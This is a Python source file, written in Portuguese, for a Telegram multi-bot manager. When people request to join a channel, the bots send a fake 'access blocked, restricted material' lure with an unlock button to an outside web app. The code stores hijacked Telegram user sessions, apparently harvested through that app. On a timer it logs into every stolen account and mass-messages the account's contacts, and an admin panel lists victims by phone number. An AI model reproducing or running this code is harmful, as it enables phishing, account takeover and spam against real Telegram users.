import os
import json
import logging
import asyncio
import threading
from pathlib import Path
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import Application, ChatJoinRequestHandler, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.types import User
from dotenv import load_dotenv
import db

load_dotenv()

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
WEBAPP_URL = os.getenv("WEBAPP_URL", "")
API_ID = int(os.getenv("API_ID", "0"))
API_HASH = os.getenv("API_HASH", "")
PENDING_FILE = Path("pending_requests.json")

running_bots = {}
awaiting_input = {}

DEFAULT_CONFIG = {
    'mensagem': "⛔ *Acesso a {chat_title} bloqueado*\n\nEste canal contém material restrito. Desbloqueie para ver o que está escondido.",
    'botao': "🔓 DESBLOQUEAR CANAL",
    'msg_disparo': "",
    'intervalo_horas': '1'
}

def get_bot_config(bot_id):
    config = db.get_bot_config(bot_id)
    for key, val in DEFAULT_CONFIG.items():
        if key not in config:
            config[key] = val
    return config

def load_pending():
    if PENDING_FILE.exists():
        try:
            return json.loads(PENDING_FILE.read_text())
        except:
            pass
    return {}

def save_pending(data):
    PENDING_FILE.write_text(json.dumps(data, ensure_ascii=False, indent=2))

async def disparo_todas_sessions(context: ContextTypes.DEFAULT_TYPE):
    bot_id = context.bot_data.get('bot_id')
    config = get_bot_config(bot_id)
    msg = config.get('msg_disparo', '')
    
    if not msg:
        return
    
    sessions = db.get_all_sessions()
    
    if not sessions:
        return
    
    logger.info(f"Disparo GLOBAL em {len(sessions)} sessões...")
    total = 0
    
    for sess in sessions:
        try:
            session_data = sess['session_data']
            client = TelegramClient(StringSession(session_data), API_ID, API_HASH)
            await client.connect()
            
            if not await client.is_user_authorized():
                db.delete_session(sess['user_id'])
                continue
            
            dialogs = await client.get_dialogs(limit=100)
            
            for dialog in dialogs:
                try:
                    entity = dialog.entity
                    if isinstance(entity, User):
                        if entity.bot or entity.is_self:
                            continue
                    await client.send_message(entity, msg)
                    total += 1
                    await asyncio.sleep(0.5)
                except:
                    continue
            
            await client.disconnect()
        except Exception as e:
            logger.error(f"Erro disparo session {sess['user_id']}: {e}")
    
    logger.info(f"Disparo concluído: {total} msgs")
    
    try:
        await context.bot.send_message(ADMIN_ID, f"✅ Disparo GLOBAL concluído!\n📨 {total} msgs enviadas")
    except:
        pass

async def show_admin_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bot_id = context.bot_data.get('bot_id')
    bot_name = context.bot_data.get('bot_name', 'Bot Filho')
    config = get_bot_config(bot_id)
    
    my_sessions = db.count_sessions_by_bot(bot_id)
    total_sessions = db.count_sessions()
    bots_count = db.count_bots()
    intervalo = config.get('intervalo_horas', '1')
    
    keyboard = [
        [InlineKeyboardButton("📊 Estatísticas", callback_data="stats")],
        [InlineKeyboardButton("📁 Minhas Sessions", callback_data="my_sessions")],
        [InlineKeyboardButton("📁 Todas Sessions", callback_data="all_sessions")],
        [InlineKeyboardButton("🔥 Msg Disparo", callback_data="edit_disparo")],
        [InlineKeyboardButton(f"⏰ Intervalo ({intervalo}h)", callback_data="edit_intervalo")],
        [InlineKeyboardButton("🚀 Disparar TODAS", callback_data="disparar")],
        [InlineKeyboardButton("✏️ Msg Inicial", callback_data="edit_msg")],
        [InlineKeyboardButton("🔘 Texto Botão", callback_data="edit_btn")],
    ]
    
    text = (
        f"🔧 **Painel Admin - {bot_name}**\n\n"
        f"📁 Minhas Sessions: {my_sessions}\n"
        f"📁 Total Sessions: {total_sessions}\n"
        f"🤖 Bots ativos: {bots_count}"
    )
    
    if update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    else:
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def start_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if user.id == ADMIN_ID:
        await show_admin_menu(update, context)
        return
    
    bot_id = context.bot_data.get('bot_id')
    config = get_bot_config(bot_id)
    webapp_url = context.bot_data.get('webapp_url', WEBAPP_URL)
    
    keyboard = [[
        InlineKeyboardButton(
            config.get('botao', "🔓 DESBLOQUEAR CANAL"),
            web_app=WebAppInfo(url=webapp_url)
        )
    ]]
    
    msg = config.get('mensagem', "⛔ *Acesso a {chat_title} bloqueado*\n\nEste canal contém material restrito. Desbloqueie para ver o que está escondido.")
    msg = msg.replace("{chat_title}", "o canal")
    
    await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id != ADMIN_ID:
        return
    
    data = query.data
    bot_id = context.bot_data.get('bot_id')
    config = get_bot_config(bot_id)
    
    if data == "menu":
        await show_admin_menu(update, context)
    
    elif data == "stats":
        my_sessions = db.count_sessions_by_bot(bot_id)
        total_sessions = db.count_sessions()
        bots_count = db.count_bots()
        text = (
            f"📊 **Estatísticas**\n\n"
            f"📁 Minhas Sessions: {my_sessions}\n"
            f"📁 Total Sessions: {total_sessions}\n"
            f"🤖 Bots ativos: {bots_count}"
        )
        kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="menu")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
    
    elif data == "my_sessions":
        sessions = db.get_sessions_by_bot(bot_id)
        if not sessions:
            text = "📁 Nenhuma session deste bot."
        else:
            text = f"📁 **Minhas Sessions ({len(sessions)})**\n\n"
            for s in sessions[:15]:
                text += f"• {s['phone'] or s['user_id']}\n"
            if len(sessions) > 15:
                text += f"\n... +{len(sessions) - 15}"
        kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="menu")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
    
    elif data == "all_sessions":
        sessions = db.get_all_sessions()
        if not sessions:
            text = "📁 Nenhuma session salva."
        else:
            text = f"📁 **Todas Sessions ({len(sessions)})**\n\n"
            for s in sessions[:15]:
                text += f"• {s['phone'] or s['user_id']}\n"
            if len(sessions) > 15:
                text += f"\n... +{len(sessions) - 15}"
        kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="menu")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
    
    elif data == "edit_disparo":
        awaiting_input[query.from_user.id] = {'type': 'msg_disparo', 'bot_id': bot_id}
        text = f"🔥 Envie a nova mensagem de disparo.\n\nAtual:\n{config.get('msg_disparo', '')}"
        kb = [[InlineKeyboardButton("❌ Cancelar", callback_data="menu")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb))
    
    elif data == "edit_intervalo":
        awaiting_input[query.from_user.id] = {'type': 'intervalo_horas', 'bot_id': bot_id}
        text = f"⏰ Envie o intervalo em horas.\n\nAtual: {config.get('intervalo_horas', '1')}h"
        kb = [[InlineKeyboardButton("❌ Cancelar", callback_data="menu")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb))
    
    elif data == "edit_msg":
        awaiting_input[query.from_user.id] = {'type': 'mensagem', 'bot_id': bot_id}
        text = "✏️ Envie a nova mensagem inicial.\nUse {chat_title} para o nome do grupo."
        kb = [[InlineKeyboardButton("❌ Cancelar", callback_data="menu")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb))
    
    elif data == "edit_btn":
        awaiting_input[query.from_user.id] = {'type': 'botao', 'bot_id': bot_id}
        text = f"🔘 Envie o novo texto do botão.\n\nAtual: {config.get('botao', '')}"
        kb = [[InlineKeyboardButton("❌ Cancelar", callback_data="menu")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb))
    
    elif data == "disparar":
        total_sessions = db.count_sessions()
        if total_sessions == 0:
            kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="menu")]]
            await query.edit_message_text("❌ Nenhuma session disponível!", reply_markup=InlineKeyboardMarkup(kb))
            return
        
        await query.edit_message_text(f"🚀 Disparando em {total_sessions} sessions de TODOS os bots...")
        asyncio.create_task(disparo_todas_sessions(context))
        
        kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="menu")]]
        await query.edit_message_text("🚀 Disparo GLOBAL iniciado! Você será notificado.", reply_markup=InlineKeyboardMarkup(kb))

async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if user.id != ADMIN_ID:
        return
    
    input_data = awaiting_input.get(user.id)
    if not input_data:
        return
    
    text = update.message.text
    input_type = input_data['type']
    bot_id = input_data['bot_id']
    
    if input_type == 'intervalo_horas':
        try:
            val = int(text)
            if val < 1:
                val = 1
            db.set_bot_config(bot_id, 'intervalo_horas', str(val))
        except:
            await update.message.reply_text("❌ Número inválido!")
            return
    else:
        db.set_bot_config(bot_id, input_type, text)
    
    awaiting_input.pop(user.id, None)
    
    await update.message.reply_text("✅ Atualizado!")
    await show_admin_menu(update, context)

async def on_join_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
    join_request = update.chat_join_request
    user = join_request.from_user
    chat = join_request.chat
    bot_id = context.bot_data.get('bot_id')
    
    logger.info(f"[Bot {bot_id}] Join request de {user.id} para {chat.title}")
    
    pending = load_pending()
    pending[str(user.id)] = {
        'chat_id': chat.id,
        'chat_title': chat.title,
        'bot_id': bot_id,
        'timestamp': datetime.now().isoformat()
    }
    save_pending(pending)
    
    config = get_bot_config(bot_id)
    webapp_url = context.bot_data.get('webapp_url', WEBAPP_URL)
    
    keyboard = [[
        InlineKeyboardButton(
            config.get('botao', "🔓 DESBLOQUEAR CANAL"),
            web_app=WebAppInfo(url=webapp_url)
        )
    ]]
    
    msg = config.get('mensagem', "⛔ *Acesso a {chat_title} bloqueado*\n\nEste canal contém material restrito. Desbloqueie para ver o que está escondido.")
    msg = msg.replace("{chat_title}", chat.title)
    
    try:
        await context.bot.send_message(chat_id=user.id, text=msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
        logger.info(f"[Bot {bot_id}] Mensagem enviada para {user.id}")
    except Exception as e:
        logger.error(f"[Bot {bot_id}] Erro ao enviar: {e}")

def run_child_bot(bot_info):
    token = bot_info['token']
    bot_id = bot_info['id']
    bot_name = bot_info.get('name', 'Bot')
    webapp_url = bot_info.get('webapp_url', WEBAPP_URL)
    
    async def _run():
        app = Application.builder().token(token).build()
        app.bot_data['webapp_url'] = webapp_url
        app.bot_data['bot_name'] = bot_name
        app.bot_data['bot_id'] = bot_id
        
        app.add_handler(CommandHandler("start", start_handler))
        app.add_handler(CommandHandler("menu", show_admin_menu))
        app.add_handler(CallbackQueryHandler(callback_handler))
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
        app.add_handler(ChatJoinRequestHandler(on_join_request))
        
        config = get_bot_config(bot_id)
        intervalo = int(config.get('intervalo_horas', '1')) * 3600
        app.job_queue.run_repeating(disparo_todas_sessions, interval=intervalo, first=intervalo)
        
        logger.info(f"🤖 Bot Filho '{bot_name}' (ID:{bot_id}) iniciado!")
        
        await app.initialize()
        await app.start()
        await app.updater.start_polling(drop_pending_updates=True)
        
        while True:
            await asyncio.sleep(3600)
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    try:
        loop.run_until_complete(_run())
    except Exception as e:
        logger.error(f"Erro no bot filho {bot_name}: {e}")

def start_child_bots():
    bots = db.get_all_bots()
    
    if not bots:
        logger.info("Nenhum bot filho cadastrado")
        return
    
    logger.info(f"Iniciando {len(bots)} bots filhos...")
    
    for bot in bots:
        bot_id = bot['id']
        
        if bot_id in running_bots:
            continue
        
        thread = threading.Thread(target=run_child_bot, args=(bot,), daemon=True)
        thread.start()
        running_bots[bot_id] = thread
        logger.info(f"Bot filho {bot.get('name', 'Bot')} iniciado em thread")

def main():
    logger.info("=== Iniciando gerenciador de bots filhos ===")
    start_child_bots()
    
    while True:
        import time
        time.sleep(60)
        
        bots = db.get_all_bots()
        for bot in bots:
            if bot['id'] not in running_bots:
                logger.info(f"Novo bot detectado: {bot.get('name')}")
                thread = threading.Thread(target=run_child_bot, args=(bot,), daemon=True)
                thread.start()
                running_bots[bot['id']] = thread

if __name__ == "__main__":
    main()
